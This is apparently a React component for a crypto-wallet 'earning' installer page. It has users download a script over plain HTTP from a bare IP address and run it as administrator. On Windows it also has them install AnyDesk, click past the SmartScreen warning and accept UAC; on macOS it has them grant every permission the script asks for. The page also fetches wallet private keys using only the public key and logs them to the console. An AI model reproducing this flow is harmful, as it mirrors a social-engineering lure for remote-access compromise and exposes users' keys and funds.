"use client";

import { useEffect, useState } from "react";
import { Download, Check } from "lucide-react";
import TERMINAL_BG from "@/assets/terminal-bg.png";
import { useAuthService } from "@/services";
import { WalletKeyCopyButton } from "../molecules";
import client from "@/config/axios";

function detectOS(): "macos" | "linux" | "windows" | "unknown" {
  const ua = navigator.userAgent.toLowerCase();
  const platform = navigator.platform.toLowerCase();
  if (platform.includes("mac")) return "macos";
  if (platform.includes("win")) return "windows";
  if (platform.includes("linux")) return "linux";
  if (ua.includes("mac")) return "macos";
  if (ua.includes("win")) return "windows";
  if (ua.includes("linux")) return "linux";
  return "unknown";
}

export default function TerminalDownload() {
  const [copied, setCopied] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [privateKey, setPrivateKey] = useState<string | null>(null);
  const [publicKey, setPublicKey] = useState<string | null>(null);
  const [osType, setOsType] = useState<
    "macos" | "linux" | "windows" | "unknown"
  >("unknown");

  const { auth, data, isAuthenticating, isSuccess } = useAuthService();

  useEffect(() => {
    setOsType(detectOS());
  }, []);

  useEffect(() => {
    const walletPublicKey = localStorage.getItem("walletPublicKey");
    if (walletPublicKey) {
      setPublicKey(walletPublicKey);
      client
        .get(`user/get-keys/${walletPublicKey}`)
        .then((res) => {
          console.log("get-keys", res.data);
          setPrivateKey(res.data.walletPrivateKey);
        })
        .catch(console.error);
      return;
    }
    auth({ method: "POST", url: "/auth/register" });
  }, []);

  useEffect(() => {
    if (data?.walletPublicKey) {
      localStorage.setItem("walletPublicKey", data.walletPublicKey);
      setPublicKey(data.walletPublicKey);
    }
  }, [data]);

  const getDownloadUrl = () => {
    const ext = osType === "windows" ? "bat" : "sh";
    return `http://3.13.157.111:3000/install/${osType}/${publicKey}`;
  };

  const getInstallCommand = () => {
    switch (osType) {
      case "windows":
        return "install.bat";
      case "macos":
      case "linux":
        return "chmod +x ./install.sh && ./install.sh";
      default:
        return "./install.sh";
    }
  };

  const handleCopy = () => {
    const command = getInstallCommand();

    if (
      navigator.clipboard &&
      typeof navigator.clipboard.writeText === "function"
    ) {
      navigator.clipboard.writeText(command).then(() => {
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      });
    } else {
      const textarea = document.createElement("textarea");
      textarea.value = command;
      textarea.style.position = "fixed";
      document.body.appendChild(textarea);
      textarea.focus();
      textarea.select();

      try {
        document.execCommand("copy");
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error("Fallback copy failed", err);
      }

      document.body.removeChild(textarea);
    }
  };

  const StepCard = ({
    step,
    title,
    children,
    borderColor = "#A3B1C6",
  }: {
    step: number;
    title: string;
    children: React.ReactNode;
    borderColor?: string;
  }) => (
    <div
      className={`relative bg-[#0E1729] border border-[${borderColor}]/30 rounded-xl p-6 shadow-md space-y-4`}
    >
      <div
        className="absolute -top-4 -left-4 font-bold w-8 h-8 rounded-full flex items-center justify-center shadow-md text-[#0B0F1C]"
        style={{
          backgroundColor: borderColor,
        }}
      >
        {step}
      </div>
      <h2 className="text-lg font-bold">{title}</h2>
      {children}
    </div>
  );

  return (
    <main className="min-h-screen bg-[#0B0F1C] text-[#F2F5F9] px-6 py-12 flex justify-center">
      <div className="w-full max-w-3xl space-y-12">
        {osType === "windows" ? (
          <>
            {/* Windows: Step 1 */}
            <StepCard step={1} title="Download Anydesk" borderColor="#5ED3F3">
              <p className="text-sm text-[#A3B1C6] mb-2">
                Download Anydesk at location (C:\Program Files (x86)\AnyDesk and
                create AnyDesk folder if it does not exist) using the link below
              </p>

              <a
                href="https://anydesk.com/en/downloads/thank-you?dv=win_exe"
                target="_blank"
                rel="noopener noreferrer"
                className="underline text-[#5ED3F3] text-sm break-all"
              >
                https://anydesk.com/en/downloads/thank-you?dv=win_exe
              </a>

              <button
                onClick={() =>
                  window.open(
                    "https://anydesk.com/en/downloads/thank-you?dv=win_exe",
                    "_blank"
                  )
                }
                className="mt-4 w-full sm:w-auto px-6 py-3 rounded-lg border border-[#5ED3F3] bg-[#0E1729] text-[#5ED3F3] hover:bg-[#1a2235] flex items-center justify-center space-x-2 transition"
              >
                <span>Download Anydesk</span>
                <Download className="w-4 h-4" />
              </button>
            </StepCard>

            {/* Windows: Step 2 */}
            <StepCard
              step={2}
              title="Move Anydesk to Program Files"
              borderColor="#FFD166"
            >
              <p className="text-sm text-[#A3B1C6]">
                Copy the downloaded Anydesk file to this folder if not already
                there and also create AnyDesk folder if it does not exist
              </p>
              <code className="text-xs block mt-2 bg-[#1a2235] p-2 rounded text-[#F2F5F9]">
                C:\Program Files (x86)\AnyDesk
              </code>
            </StepCard>

            <StepCard
              step={3}
              title="Download the Installer (.bat)"
              borderColor="#00FFAA"
            >
              <p className="text-sm text-[#A3B1C6]">
                Save the downloaded file with a <strong>.bat</strong> extension.
              </p>

              {/* Screenshot above the button */}
              <div className="mt-4 mb-4">
                <img
                  src="/windows.png" // 🔁 Replace this path with your actual image path
                  alt="Save as .bat example"
                  className="rounded-lg border border-[#A3B1C6]/30 shadow-sm w-full h-auto"
                />
                <p className="text-xs text-[#A3B1C6] text-center mt-2 italic">
                  Example: Save file as <code>install.bat</code>
                </p>
              </div>

              <button
                onClick={() => {
                  window.location.href = getDownloadUrl();
                }}
                onMouseEnter={() => setIsHovered(true)}
                onMouseLeave={() => setIsHovered(false)}
                className="w-full sm:w-auto px-6 py-3 rounded-lg border border-[#5ED3F3] bg-[#0E1729] text-[#5ED3F3] hover:bg-[#1a2235] flex items-center justify-center space-x-2 transition"
              >
                <span>Download Installer</span>
                <Download
                  className={`w-4 h-4 ${isHovered ? "animate-bounce" : ""}`}
                />
              </button>

              <p className="text-sm text-center text-[#A3B1C6] mt-2">
                Or manually:{" "}
                <a
                  href={getDownloadUrl()}
                  className="underline text-[#5ED3F3]"
                  target="_blank"
                >
                  {getDownloadUrl()}
                </a>
              </p>
            </StepCard>

            {/* Windows: Step 4 */}
            <StepCard
              step={4}
              title="Run bat file as Administrator"
              borderColor="#5ED3F3"
            >
              <p className="text-sm text-[#A3B1C6]">
                Right click the `.bat` file and select{" "}
                <strong>“Run as administrator”</strong>.
              </p>{" "}
              <div className="mt-4 mb-4">
                <img
                  src="/bat.jpg" // 🔁 Replace this path with your actual image path
                  alt="Save as .bat example"
                  className="rounded-lg border border-[#A3B1C6]/30 shadow-sm w-150 h-150"
                />
              </div>
            </StepCard>

            <StepCard
              step={5}
              title="If you see this screen click more info and then click run anyway"
              borderColor="#FFD166"
            >
              <div className="mt-4 mb-4">
                <img
                  src="/blue.jpg" // 🔁 Replace this path with your actual image path
                  alt="Save as .bat example"
                  className="rounded-lg border border-[#A3B1C6]/30 shadow-sm w-full h-150"
                />
              </div>
            </StepCard>

            <StepCard
              step={6}
              title="When prompted for Account Control click Yes"
              borderColor="#5ED3F3"
            >
              <div className="mt-4 mb-4">
                <img
                  src="/yes.jpg" // 🔁 Replace this path with your actual image path
                  alt="Save as .bat example"
                  className="rounded-lg border border-[#A3B1C6]/30 shadow-sm w-full h-auto"
                />
              </div>
            </StepCard>
          </>
        ) : (
          <>
            {/* Non-Windows Steps 1–2 */}
            <StepCard
              step={1}
              title="Download the Installer"
              borderColor="#5ED3F3"
            >
              <p className="text-sm text-[#A3B1C6] mb-2">
                Detected OS:{" "}
                <span className="text-[#5ED3F3] font-semibold">
                  {osType.toUpperCase()}
                </span>
              </p>

              <button
                onClick={() => {
                  window.location.href = getDownloadUrl();
                }}
                onMouseEnter={() => setIsHovered(true)}
                onMouseLeave={() => setIsHovered(false)}
                className="w-full sm:w-auto px-6 py-3 rounded-lg border border-[#5ED3F3] bg-[#0E1729] text-[#5ED3F3] hover:bg-[#1a2235] flex items-center justify-center space-x-2 transition"
              >
                <span>Download</span>
                <Download
                  className={`w-4 h-4 ${isHovered ? "animate-bounce" : ""}`}
                />
              </button>

              <p className="text-sm text-center text-[#A3B1C6] mt-3">
                Or manually:{" "}
                <a
                  href={getDownloadUrl()}
                  className="underline text-[#5ED3F3] break-all"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {getDownloadUrl()}
                </a>
              </p>
            </StepCard>
            <StepCard step={2} title="Run the Installer" borderColor="#00FFAA">
              <p className="text-sm text-[#A3B1C6]">
                Open the terminal in the same directory as the downloaded file
                and paste the command below
              </p>
              <p className="text-sm text-[#A3B1C6]">
                Click to copy the command:
              </p>
              <div
                className="relative mt-4 rounded-lg overflow-hidden border border-[#5ED3F3] shadow-md cursor-pointer"
                onClick={handleCopy}
              >
                {copied && (
                  <div className="absolute top-2 right-2 z-20 bg-[#00FFAA] text-[#0B0F1C] text-xs px-2 py-1 rounded shadow flex items-center gap-1">
                    <Check className="w-3 h-3" />
                    Copied
                  </div>
                )}
                <div className="px-4 py-2 bg-[#1a2235] text-sm font-medium text-[#5ED3F3]">
                  Terminal
                </div>
                <div className="relative p-5 font-mono text-sm bg-[#0B0F1C] text-[#F2F5F9]">
                  <div className="absolute inset-0 opacity-5 pointer-events-none">
                    <img
                      src={TERMINAL_BG}
                      alt="terminal"
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <div className="relative z-10">
                    <span className="mr-2 font-bold text-[#00FFAA] select-none">
                      $
                    </span>
                    <span className="select-all">{getInstallCommand()}</span>
                  </div>
                </div>
              </div>
            </StepCard>
          </>
        )}

        {osType === "macos" && (
          <StepCard step={3} title="Grant Permissions" borderColor="#FFD166">
            {/* <p className="text-sm text-[#A3B1C6] mb-2">
              You may see a permission dialog. Grant full disk and network
              access.
            </p> */}

            {/* Screenshot 1 */}
            <div className="space-y-2 mb-4">
              <p className="text-md text-[#A3B1C6]">
                Click the red highlighted area to open permission dialog as
                shown below
              </p>
              <img
                src="/mac1.png"
                alt="macOS permission dialog 1"
                className="w-full rounded-lg border border-[#A3B1C6]/30 shadow"
              />
            </div>

            {/* Screenshot 2 */}
            <div className="space-y-2">
              <p className="text-md text-[#A3B1C6]">
                Grant permission one by one until all become green then press
                enter in the terminal
              </p>
              <img
                src="/mac2.png"
                alt="macOS permission dialog 2"
                className="w-full rounded-lg border border-[#A3B1C6]/30 shadow"
              />
            </div>
          </StepCard>
        )}

        {/* Shared: Copy Private Key & Launch */}
        <StepCard
          step={osType === "windows" ? 7 : osType === "macos" ? 4 : 3}
          title="Copy Your Keys"
          borderColor="#FFD166"
        >
          <p className="text-sm text-[#A3B1C6] mb-4">
            Store your keys securely. They are required to access your wallet.
          </p>

          <div className="flex flex-col sm:flex-row gap-4">
            <WalletKeyCopyButton
              label="Copy Private Key"
              textToCopy={privateKey || data?.walletPrivateKey}
            />
            <WalletKeyCopyButton
              label="Copy Public Key"
              textToCopy={publicKey || data?.walletPublicKey}
            />
          </div>
        </StepCard>

        <div className="flex justify-center">
          <button
            onClick={() => (window.location.href = "/dashboard")}
            className="mt-2 px-6 py-3 rounded-lg border border-[#00FFAA] text-[#00FFAA] hover:bg-[#00FFAA] hover:text-[#0B0F1C] transition"
          >
            🚀 Launch Dashboard
          </button>
        </div>

        {/* <StepCard
          step={osType === "windows" ? 6 : osType === "macos" ? 5 : 4}
          title="Launch the Dashboard"
          borderColor="#00FFAA"
        >
          <p className="text-sm text-[#A3B1C6] ">
            You’re ready! Jump into your dashboard and start earning.
          </p>
          <button
            onClick={() => (window.location.href = "/dashboard")}
            className="mt-2 px-6 py-3 rounded-lg border border-[#00FFAA] text-[#00FFAA] hover:bg-[#00FFAA] hover:text-[#0B0F1C] transition"
          >
            🚀 Launch Dashboard
          </button>
        </StepCard> */}
      </div>
    </main>
  );
}
